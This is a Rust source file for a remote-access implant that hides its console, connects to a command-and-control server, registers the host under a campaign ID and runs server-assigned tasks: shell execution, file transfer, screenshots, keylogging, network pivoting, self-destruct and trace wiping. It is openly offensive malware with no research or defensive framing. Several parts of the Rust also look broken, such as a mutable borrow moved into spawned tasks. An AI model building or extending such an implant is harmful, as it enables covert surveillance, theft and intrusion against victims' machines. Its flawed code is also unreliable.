#![no_main] // For minimal binary size
#![windows_subsystem = "windows"] // Hide console on Windows

mod config;
mod crypto;
mod protocol;
mod tasks;
mod system;

use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time::{interval, timeout};

const MAX_RETRY_DELAY: Duration = Duration::from_secs(300); // 5 minutes
const INITIAL_RETRY_DELAY: Duration = Duration::from_secs(5);

#[tokio::main(flavor = "current_thread")]
async fn main() {
    // Initialize with minimal footprint
    let config = config::load_config();
    
    let mut retry_delay = INITIAL_RETRY_DELAY;
    
    loop {
        match run_implant(&config).await {
            Ok(()) => {
                // Clean exit requested
                break;
            }
            Err(e) => {
                eprintln!("Connection error: {}", e);
                
                // Exponential backoff with jitter
                tokio::time::sleep(retry_delay).await;
                retry_delay = (retry_delay * 2).min(MAX_RETRY_DELAY);
                
                // Add jitter (±25%)
                let jitter = rand::random::<u64>() % (retry_delay.as_millis() as u64 / 4);
                tokio::time::sleep(Duration::from_millis(jitter)).await;
            }
        }
    }
}

async fn run_implant(config: &config::Config) -> Result<(), Box<dyn std::error::Error>> {
    // Connect to C2 server
    let stream = TcpStream::connect(&config.c2_address).await?;
    
    // Perform Noise handshake
    let (mut transport, session_id) = crypto::handshake(stream, &config.public_key).await?;
    
    // Send registration
    let reg = system::gather_info(&config.campaign_id);
    protocol::send_register(&mut transport, &reg).await?;
    
    // Receive registration response
    let response = protocol::recv_message(&mut transport).await?;
    let heartbeat_interval = response.heartbeat_interval_sec;
    
    println!("Registered with session: {}", hex::encode(&session_id));
    
    // Main loop
    let mut heartbeat = interval(Duration::from_secs(heartbeat_interval as u64));
    let mut retry_delay = INITIAL_RETRY_DELAY;
    
    loop {
        tokio::select! {
            _ = heartbeat.tick() => {
                // Send heartbeat
                let hb = system::get_heartbeat();
                protocol::send_heartbeat(&mut transport, &hb).await?;
                
                // Check for tasks
                if let Some(tasks) = protocol::recv_tasks(&mut transport).await? {
                    for task in tasks {
                        // Execute task in background
                        let transport_ref = &mut transport;
                        tokio::spawn(async move {
                            match execute_task(task, transport_ref).await {
                                Ok(result) => {
                                    let _ = protocol::send_result(transport_ref, result).await;
                                }
                                Err(e) => {
                                    let _ = protocol::send_error(transport_ref, task.task_id, &e.to_string()).await;
                                }
                            }
                        });
                    }
                }
                
                // Reset retry delay on successful communication
                retry_delay = INITIAL_RETRY_DELAY;
            }
            
            // Check for server messages (reconfigure, terminate)
            result = timeout(Duration::from_secs(1), protocol::recv_message(&mut transport)) => {
                match result {
                    Ok(Ok(msg)) => {
                        if let Some(action) = handle_server_message(msg).await? {
                            match action {
                                ServerAction::Reconfigure(new_config) => {
                                    // Apply new configuration
                                }
                                ServerAction::Terminate(wipe) => {
                                    if wipe {
                                        cleanup_traces().await;
                                    }
                                    return Ok(()); // Clean exit
                                }
                            }
                        }
                    }
                    Ok(Err(e)) => return Err(e.into()),
                    Err(_) => {} // Timeout, continue
                }
            }
        }
    }
}

async fn execute_task(
    task: protocol::TaskAssignment,
    transport: &mut crypto::Transport,
) -> Result<protocol::TaskResult, Box<dyn std::error::Error>> {
    let start = std::time::Instant::now();
    
    let result = match task.task_type {
        0 => tasks::shell_exec(&task.payload).await,           // SHELL_EXEC
        1 => tasks::file_upload(&task.payload).await,          // FILE_UPLOAD
        2 => tasks::file_download(&task.payload).await,        // FILE_DOWNLOAD
        3 => tasks::process_list().await,                      // PROCESS_LIST
        4 => tasks::screenshot().await,                        // SCREENSHOT
        5 => tasks::keylog_start().await,                      // KEYLOG_START
        6 => tasks::keylog_stop().await,                       // KEYLOG_STOP
        7 => tasks::pivot_setup(&task.payload).await,          // PIVOT_SETUP
        99 => {
            // SELF_DESTRUCT
            cleanup_traces().await;
            std::process::exit(0);
        }
        _ => Err("Unknown task type".into()),
    };
    
    let execution_time = start.elapsed().as_millis() as u32;
    
    Ok(protocol::TaskResult {
        task_id: task.task_id,
        result: match result {
            Ok(data) => Some(protocol::TaskResultData::Output(data)),
            Err(e) => Some(protocol::TaskResultData::Error(e.to_string())),
        },
        execution_time_ms: execution_time,
    })
}

async fn handle_server_message(msg: protocol::ServerMessage) -> Result<Option<ServerAction>, Box<dyn std::error::Error>> {
    use protocol::ServerMessagePayload;
    
    match msg.payload {
        Some(ServerMessagePayload::Reconfigure(cmd)) => {
            // Apply new configuration
            Ok(Some(ServerAction::Reconfigure(cmd)))
        }
        Some(ServerMessagePayload::Terminate(cmd)) => {
            Ok(Some(ServerAction::Terminate(cmd.wipe_traces)))
        }
        _ => Ok(None),
    }
}

enum ServerAction {
    Reconfigure(protocol::ReconfigureCommand),
    Terminate(bool),
}

async fn cleanup_traces() {
    // Remove persistence mechanisms
    // Clear logs
    // Overwrite sensitive memory
    // Self-delete executable
}